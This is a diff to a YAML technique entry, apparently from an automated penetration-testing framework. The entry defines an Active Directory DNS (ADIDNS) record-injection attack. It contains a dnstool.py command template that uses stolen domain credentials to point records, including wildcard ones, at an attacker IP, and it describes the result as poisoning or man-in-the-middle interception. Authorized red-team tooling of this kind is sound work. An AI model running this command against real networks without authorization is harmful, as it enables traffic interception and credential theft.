@@ -2,16 +2,22 @@ name: adidns_record
 category: ad
 description: ADIDNS record creation/modification
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 dnstool.py -u '{domain}\{username}' -p '{password}' -r '{record}' -a add -d {attacker_ip} {target_ip}"
-parser: null
+command_template: 'python3 dnstool.py -u ''{domain}\{username}'' -p ''{password}''
+  -r ''{record}'' -a add -d {attacker_ip} {target_ip}
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- dns_records_found
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Any authenticated user can create ADIDNS records by default. Add wildcard (*) record pointing to attacker for LLMNR-like poisoning, or specific records for targeted MITM."
+mechanism: Any authenticated user can create ADIDNS records by default. Add wildcard
+  (*) record pointing to attacker for LLMNR-like poisoning, or specific records for
+  targeted MITM.
+hacktricks_ref: generic-methodologies-and-resources/phishing-methodology/README.md
